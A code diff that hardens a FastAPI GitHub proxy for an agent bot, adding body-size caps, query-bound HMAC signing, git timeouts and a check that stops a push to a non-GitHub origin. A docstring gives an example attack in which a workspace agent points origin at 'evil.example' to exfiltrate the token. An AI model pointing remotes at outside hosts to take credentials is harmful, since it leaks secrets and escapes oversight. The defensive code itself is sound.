@@ -11,12 +11,15 @@ each one names exactly one operation robomp performs.
 
 from __future__ import annotations
 
+import asyncio
 import logging
+import subprocess
 from collections.abc import AsyncIterator
 from contextlib import asynccontextmanager
 from dataclasses import asdict
 from pathlib import Path
 from typing import Any
+from urllib.parse import urlparse
 
 from fastapi import FastAPI, HTTPException, Request, status
 from fastapi.responses import JSONResponse
@@ -134,6 +137,68 @@ def _resolve_hmac_key(cfg: Settings) -> bytes:
     return cfg.gh_proxy_hmac_key.get_secret_value().encode("utf-8")
 
 
+
+_ORIGIN_READ_TIMEOUT_SECONDS = 5.0
+
+
+def _read_origin_url(repo_dir: Path) -> str:
+    """Return the worktree's `origin` remote URL, or raise HTTPException."""
+    try:
+        proc = subprocess.run(
+            ["git", "-C", str(repo_dir), "remote", "get-url", "origin"],
+            capture_output=True,
+            text=True,
+            check=False,
+            timeout=_ORIGIN_READ_TIMEOUT_SECONDS,
+        )
+    except subprocess.TimeoutExpired as exc:
+        raise HTTPException(504, "timeout reading origin url") from exc
+    if proc.returncode != 0:
+        # `git remote get-url` writes nothing useful to stdout on failure; do
+        # NOT echo stderr to the client (may leak local paths). The proxy log
+        # already captured the failure.
+        log.warning("gh-proxy: failed to read origin url", extra={"repo_dir": str(repo_dir)})
+        raise HTTPException(400, "could not read origin url for worktree")
+    return proc.stdout.strip()
+
+
+def _assert_origin_safe_for_repo(repo_dir: Path, expected_repo: str) -> None:
+    """Refuse the push if the worktree's `origin` would leak the PAT.
+
+    The PAT is injected via `--config-env http.extraHeader=…` (see
+    `git_ops._run_git`); git ONLY forwards that header on HTTP(S) requests.
+    So:
+      • If `origin` is HTTPS/HTTP, it MUST resolve to
+        `github.com/<expected_repo>` exactly — anything else and we'd be
+        handing the bot's token to an attacker-controlled host.
+      • Other schemes (ssh, file, git://, …) can't carry the PAT header,
+        so we let them through; the legitimate test path uses local file
+        remotes.
+
+    Without this guard, an agent with shell access in the workspace could
+    `git remote set-url origin https://evil.example/x.git` and the proxy
+    would happily push (with the PAT) to that remote.
+    """
+    url = _read_origin_url(repo_dir)
+    parsed = urlparse(url)
+    scheme = (parsed.scheme or "").lower()
+    if scheme not in ("http", "https"):
+        return  # PAT header is never sent over non-http(s); safe by construction
+    host = (parsed.hostname or "").lower()
+    # Strip optional leading slash, trailing slash, and `.git` suffix.
+    path = parsed.path.strip("/")
+    if path.endswith(".git"):
+        path = path[:-4]
+    if host != "github.com" or path.lower() != expected_repo.lower():
+        log.warning(
+            "gh-proxy: refusing push — origin does not match repo",
+            extra={"expected_repo": expected_repo, "origin_host": host},
+        )
+        raise HTTPException(
+            400,
+            f"origin url does not match repo {expected_repo!r}; refusing to push",
+        )
+
 def create_proxy_app(settings: Settings) -> FastAPI:
     """Build the gh-proxy FastAPI app bound to `settings`."""
 
@@ -145,13 +210,59 @@ def create_proxy_app(settings: Settings) -> FastAPI:
 
     app = FastAPI(title="robomp-gh-proxy", version="0.1.0", lifespan=lifespan)
 
+    def _request_target(request: Request) -> str:
+        """Canonical signing target: `path` plus raw query string if any.
+
+        Binding the query into the HMAC stops an attacker from replaying a
+        signed `/gh/v1/issue?repo=octo/widget&number=1` against
+        `?repo=octo/widget&number=2`.
+        """
+        query = request.url.query
+        return f"{request.url.path}?{query}" if query else request.url.path
+
+    async def _read_body_capped(request: Request) -> bytes:
+        """Read the request body with a hard byte cap.
+
+        Checks `Content-Length` first (cheap reject before any read), then
+        streams chunks via `request.stream()` with a running counter so a
+        client that lies about (or omits) the header still can't get more
+        than `max_bytes` into memory. We deliberately do NOT call
+        `request.body()` first — that would buffer the full payload before
+        auth checks ever run.
+        """
+        max_bytes = settings.gh_proxy_max_body_bytes
+        cl = request.headers.get("content-length")
+        if cl is not None:
+            try:
+                declared = int(cl)
+            except ValueError as exc:
+                raise HTTPException(400, "invalid content-length") from exc
+            if declared > max_bytes:
+                raise HTTPException(status.HTTP_413_REQUEST_ENTITY_TOO_LARGE, "request body too large")
+        chunks: list[bytes] = []
+        total = 0
+        async for chunk in request.stream():
+            if not chunk:
+                continue
+            total += len(chunk)
+            if total > max_bytes:
+                raise HTTPException(status.HTTP_413_REQUEST_ENTITY_TOO_LARGE, "request body too large")
+            chunks.append(chunk)
+        body = b"".join(chunks)
+        # Starlette's `request.body()` / `request.json()` re-read from
+        # `request._body`. We consumed the stream above, so seed the cache
+        # to keep downstream JSON parsing working without a second read.
+        request._body = body  # type: ignore[attr-defined]
+        return body
+
     async def _authenticate(request: Request) -> bytes:
-        body = await request.body()
+        body = await _read_body_capped(request)
         ts = request.headers.get(HEADER_TIMESTAMP)
         sig = request.headers.get(HEADER_SIGNATURE)
+        target = _request_target(request)
         result = verify(
             method=request.method,
-            path=request.url.path,
+            path=target,
             body=body,
             timestamp=ts,
             signature=sig,
@@ -336,6 +447,29 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         return JSONResponse({"ok": True})
 
     # ---- git transport ----
+    #
+    # The underlying `robomp.git_ops` primitives are blocking `subprocess.run`
+    # calls. Running them directly from an `async def` handler pins the
+    # event loop until the subprocess returns; a hung git would freeze the
+    # whole proxy. We bridge with `asyncio.to_thread` (work on a threadpool
+    # worker) wrapped in `asyncio.wait_for` (hard wall-clock cap, returns
+    # 504 on timeout). The subprocess itself can outlive the timeout — a
+    # proper subprocess.kill plumbing would have to live inside
+    # `git_ops._run_git`; flagged for follow-up.
+
+    async def _run_git_op(fn, *args, **kwargs):  # type: ignore[no-untyped-def]
+        try:
+            return await asyncio.wait_for(
+                asyncio.to_thread(fn, *args, **kwargs),
+                timeout=settings.gh_proxy_git_timeout_seconds,
+            )
+        except TimeoutError as exc:
+            log.warning(
+                "gh-proxy: git op exceeded timeout",
+                extra={"op": fn.__name__, "timeout": settings.gh_proxy_git_timeout_seconds},
+            )
+            raise HTTPException(504, f"git {fn.__name__} timed out") from exc
+
     @app.post("/gh/v1/git/clone")
     async def git_clone_endpoint(request: Request) -> JSONResponse:
         data = await _json_body(request)
@@ -344,7 +478,8 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         default_branch = _require_str(data.get("default_branch"), "default_branch")
         target = _pool_dir(settings, repo)
         try:
-            git_clone(
+            await _run_git_op(
+                git_clone,
                 target,
                 clone_url=clone_url,
                 default_branch=default_branch,
@@ -360,7 +495,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         repo = _require_str(data.get("repo"), "repo")
         target = _pool_dir(settings, repo)
         try:
-            git_fetch_prune(target, token=_resolve_token(settings))
+            await _run_git_op(git_fetch_prune, target, token=_resolve_token(settings))
         except GitCommandError as exc:
             return _git_error_response(exc)
         return JSONResponse({"pool_dir": str(target)})
@@ -372,7 +507,7 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         ref = _require_str(data.get("ref"), "ref")
         target = _pool_dir(settings, repo)
         # fetch_ref is intentionally best-effort; never surfaces a 5xx.
-        git_fetch_ref(target, ref, token=_resolve_token(settings))
+        await _run_git_op(git_fetch_ref, target, ref, token=_resolve_token(settings))
         return JSONResponse({"pool_dir": str(target)})
 
     @app.post("/gh/v1/git/push")
@@ -389,8 +524,12 @@ def create_proxy_app(settings: Settings) -> FastAPI:
         repo_dir = _workspace_repo_dir(settings, workspace_key)
         if not repo_dir.is_dir():
             raise HTTPException(404, f"workspace not found: {workspace_key}")
+        # Block attacker-controlled `origin` from being a PAT exfil channel.
+        # MUST run BEFORE any subprocess that would inject the token header.
+        await asyncio.to_thread(_assert_origin_safe_for_repo, repo_dir, repo)
         try:
-            result = git_push(
+            result = await _run_git_op(
+                git_push,
                 repo_dir,
                 branch=branch,
                 expected_head=expected_head,
